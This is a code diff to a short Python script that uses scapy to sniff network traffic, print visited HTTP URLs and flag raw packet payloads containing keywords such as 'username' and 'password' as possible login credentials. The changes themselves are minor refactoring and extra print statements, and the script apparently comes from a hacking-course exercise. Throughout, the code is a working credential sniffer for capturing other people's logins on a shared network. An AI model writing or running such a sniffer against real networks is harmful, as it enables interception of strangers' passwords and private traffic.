@@ -14,9 +14,11 @@ def get_interface():
         return(interface)
 
 def sniff(interface):
-    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)
+    print("[+] Starting scan.")
+    scapy.sniff(iface=interface,store=False,prn=process_packet)
 
-def process_sniffed_packet(packet):
+def process_packet(packet):
+    print(packet.show())
     if packet.haslayer(http.HTTPRequest):
         get_url(packet)
         if packet.haslayer(scapy.Raw):
@@ -24,8 +26,9 @@ def process_sniffed_packet(packet):
 
 def get_url(packet):
     url=(bytes(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode())
-    print("[+] HTTP Request >> " + url)
-    return()
+    if url:
+        print("[+] HTTP Request >> " + url)
+    return
 
 def get_login_info(packet):
     keywords = ["username","uname","user","login","password","pass"]
@@ -33,10 +36,11 @@ def get_login_info(packet):
     for keyword in keywords:
         if keyword in load:
             print("[+] Possible username/password >> " + load)
-            return()
+            return
 
 def main():
     interface = get_interface()
     sniff(interface)
+    print("\n[+] Programme exited successfully.")
 
 main()
